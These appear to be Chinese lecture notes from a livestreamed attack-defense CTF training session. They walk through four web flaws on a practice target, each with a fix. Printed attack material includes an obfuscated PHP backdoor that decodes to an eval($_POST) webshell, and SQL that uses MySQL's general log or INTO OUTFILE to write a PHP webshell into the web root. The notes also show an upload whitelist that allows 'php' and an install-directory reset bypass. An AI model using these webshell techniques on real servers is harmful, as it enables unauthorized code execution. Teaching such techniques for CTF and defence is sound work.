直播7点半准时开始
今天讲的题目：ivears

如果有什么问题可以直接在聊天里面先留言，看见都会一一解答，只管问 



拿到题目一般怎么分析，然后事先需要准备什么必备软件和批量脚本

备份
    备份什么
        站点
        数据库
    通过什么工具备份
        站点-> winSCP -> xshell插件 -> MobaXterm 自带sftp
        数据库备份 -> 拿sh脚本 -> php脚本去备份 -> mysql命令备份

弱口令
    ssh
    mysql
    WEB应用


扫预留后门

通防脚本waf，流量抓取脚本，文件监控，进程监控，批量webshell利用模版


php脚本 python脚本   






如何在自己靶机部流量分析，分析流量包学习别人的攻击方法？
    首先你拿到是普通用户的权限，也就是开启不了tcpdump


怎样做批量脚本,用什么软件和语言做 合适
    先学python 



路径中的/user/是怎么判断出来的?




# 1. 网页后门


## 解题步骤
我们通过D盾扫描站点源码，发现`/Lib/Action/Home/HomeAction.class.php 65`
存在后门

```php
@$_=[].'';@$___=$_[''];$____=$___;$____++;$_____=$____;$_____++;$______=$_____;$______++;$_______=$______;$_______++;$________=$_______;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$_________=$________;$_________++;$_________++;$_________++;$_________++;$_=$____.$___.$_________.$_______.'6'.'4'.'_'.$______.$_______.$_____.$________.$______.$_______;$________++;$________++;$________++;$_____=$_________;$_____++;$__=$___.$_________.$_________.$_______.$________.$_____;@$__($_("ZXZhbCgkX1BPU1RbY10p"));
```

分析代码得到`ZXZhbCgkX1BPU1RbY10p`是经过BASE64编码过的，所以我们解码之后的到字符串`eval($_POST[c])`
最后得到密码为`c`


另外发现需要执行该方法需要构造不存在的页面才能跳转到`_404`中
所以我们构造页面为`http://101.71.29.6:10016/user/111`
通过菜刀连接


路径中的/user/是怎么判断出来的?

站点路由规则
http://101.71.29.6:10016/Article/
http://101.71.29.6:10016/lib/xxx/ArticleController/index.php



## 防护方法
删除该代码即可



我们可以根据站点源码中的一些信息去判断该站点是否是CMS

在互联网搜索一些已经被安全研究员挖掘出的漏洞去利用


# 2. phpmyadmin 后台getshell

## 解题步骤
如何找到数据库的密码，去找`config conf *.config`这些配置文件
`root/toor`


进入后台之后我们会三种思路去getshell
1. 写入一句话
  - 不行，原因:mysql具有安全设置，不允许进行写入文件操作
  - `SELECT '<?php @eval($_POST[c]); ?>' INTO OUTFILE '/var/www/html/shell.php'`
2. phpmyadmin本身存在的getshell漏洞
  - 不行，原因：是最新版本的phpmyadmin
3. 通过日志写入一句话
  - 可行
[phpmyadmin 后台getshell方法](https://www.k2zone.cn/?p=1725)

mysql会有日志文件
我们能不能去改变这个文件的目录，去指向网站根目录,可写的文件中
然后通过执行SQL语句去将php代码写入到日志中，最后getshell

以下是sql利用代码
```sql
set global general_log=on;
set global general_log_file='/var/www/html/1.php';
select "<?php @eval($_POST['cmd']); ?>"
set global general_log=off;
```


## 防护方法
1. 修改数据库密码
2. 删除`1.php`文件



# 3. install重装漏洞

## 解题步骤
我们发现存在`/install`目录，联想到是否存在网站重装漏洞存在，
分析过`index.php`中的代码后，发现是有对重装问题做验证的，
但是我们可以绕过其中的验证，直接访问`http://101.71.29.6:10024/install/`目录，对站点进行重装

重装的确拿不到shell，但是会重置他人的站点，也就是别人做的代码补丁或修改WEB应用口令等会无效，站点会被重置。


## 防护方法
删除`/install/`目录即可




通过seay自动代码审计发现具有疑点的文件和代码，来分析判断是否存在漏洞

我们通过站点直接过"白盒测试"来进行分析

我们常见的WEB通过漏洞
弱口令
SQL
XSS
文件上传
文件包含
SSRF
XPATH
XXE
命令/代码执行
任意文件下载
反序列化漏洞
...

输入点 输出点


如何找到管理员密码
弱口令
查找数据库，分析密码的加密算法

最后得到帐号密码为`admin/admin`

# 4. 文件上传漏洞

## 解题步骤

我们找到文件上传功能，分析文件上传代码`/Public/kindeditor/php/upload_json.php`
得到允许上传php文件，可以直接getshell
我们在分析文件上传功能中发现，该接口不需要进行登录即可上传，存在越权漏洞

```php
//定义允许上传的文件扩展名
$ext_arr = array(
	'image' => array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'php'),
	'flash' => array('swf', 'flv'),
	'media' => array('swf', 'flv', 'mp3', 'wav', 'wma', 'wmv', 'mid', 'avi', 'mpg', 'asf', 'rm', 'rmvb'),
	'file' => array('doc', 'docx', 'xls', 'xlsx', 'ppt', 'htm', 'html', 'txt', 'zip', 'rar', 'gz', 'bz2'),
);
```


## 防护方法
把`28`行中的`php`去除即可

返回的文件在服务器上的地址怎么看的？




